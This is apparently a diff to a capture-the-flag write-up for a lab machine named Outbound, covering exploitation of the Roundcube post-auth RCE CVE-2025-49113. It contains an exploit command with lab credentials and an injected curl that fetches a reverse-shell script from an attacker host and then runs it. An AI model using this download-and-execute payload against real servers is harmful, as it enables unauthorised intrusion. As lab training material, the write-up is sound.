@@ -1,4 +1,3 @@
-
 # Outbound - Active Machine
 Outbound is  a Linux machine flagged Easy in the Active Machines and obviously little hard. This Box replicate some of the new Vulns and updated one.
 
@@ -18,7 +17,7 @@ Instead making a vulnerability scanning using `Nuclei` gave me a vulnerability _
 > [!NOTE]
 > CVE‑2025‑49113 – Post‑Auth Remote Code Execution vulnerability in Roundcube
 
-The exploit script is found in "[github](https://github.com/hakaioffsec/CVE-2025-49113-exploit)", which is written in php.
+The exploit script is found in "[Github](https://github.com/hakaioffsec/CVE-2025-49113-exploit)", which is written in php.
 
 ## Step 3 - Exploit
 The exploit of the vulnerability is using the post authentication remote code execution and run arbitary code afer authentication. The user creds are given
@@ -40,7 +39,7 @@ That require a small payload which runs on the victim to provide us the shell.
 ```
 php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "curl <attackbox IP>/exploit.sh -o /tmp/nithin.sh && chmod +x /tmp/nithin.sh && /bin/bash -c /tmp/nithin.sh"
 ```
-- `curl <attackbox IP>/exploit.sh -o /tmp/nithin.sh` - Downloads your reverse shell script (exploit.sh) from your attacker machine and saves it to /tmp/nithin.sh on the victim.
+- `curl <attackbox IP>/exploit.sh -o /tmp/nithin.sh` - Downloads your reverse shell script (exploit.sh) from your attacker machine and saves it to `/tmp/nithin.sh` on the victim.
 - `chmod +x /tmp/nithin.sh` - Makes the script executable.
 - `/bin/bash -c /tmp/nithin.sh` - Executes the script in a bash shell.
 
